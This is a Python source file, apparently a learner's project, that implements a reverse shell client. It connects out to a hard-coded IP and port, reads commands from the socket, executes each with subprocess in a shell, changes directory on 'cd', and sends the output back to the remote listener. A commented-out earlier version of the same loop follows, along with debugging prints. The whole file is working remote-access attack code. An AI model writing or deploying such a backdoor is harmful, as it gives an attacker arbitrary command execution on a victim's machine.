import socket
import os
import subprocess

# manual edit required
host = "192.168.1.70"
port = 45566

try:
    # socket creation and connection
    s = socket.socket()
    s.connect((host, port))
except Exception as e:
    print(f"Error: {e}")

while True:
    cmd = s.recv(8).decode("utf-8")
    if cmd == "quit":
        print(f"Command: {cmd}")
        break
    while len(cmd) >= 0:
        print(cmd)
        cmd_part = s.recv(8).decode("utf-8")  # stops here, why?
        print("here")
        if len(cmd_part) <= 0:
            s.close()
            s = socket.socket()
            s.connect((host, port))
            break
        cmd += cmd_part
    print(f"Command: {cmd}")
    cmdShell = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    if cmd[:2] == "cd" and cmd[3:] != "":
        try:
            os.chdir(cmd[3:])
        except Exception as e:
            print(f"Direcory changing error: {e}")
    outputStr = (cmdShell.stdout.read() +
                 cmdShell.stderr.read()).decode("utf-8")
    currWd = os.getcwd()+"> "
    s.send(str.encode(outputStr+currWd, "utf-8"))
    print(outputStr)

# while True:
#     cmd = s.recv(8).decode("utf-8")
#     while True:
#         cmd_part = s.recv(8).decode("utf-8")
#         print(f"CmdPart: {cmd_part}, {len(cmd_part)}")
#         if len(cmd_part) <= 0:
#             break
#         print(f"Cmd: {cmd}")
#         cmd += cmd_part
#         print(f"Cmd: {cmd}")
#     print(f"Command: {cmd}")
#     if cmd == "quit":
#         break
#     else:
#         if len(cmd) > 0:
#             cmdShell = subprocess.Popen(
#                 cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
#             if cmd[:2] == "cd" and cmd[3:] != "":
#                 try:
#                     os.chdir(cmd[3:])
#                 except Exception as e:
#                     pass
#             outputStr = (cmdShell.stdout.read() +
#                          cmdShell.stderr.read()).decode("utf-8")
#             currWd = os.getcwd()+"> "
#             s.send(str.encode(outputStr+currWd, "utf-8"))
#             print(outputStr)

s.close()
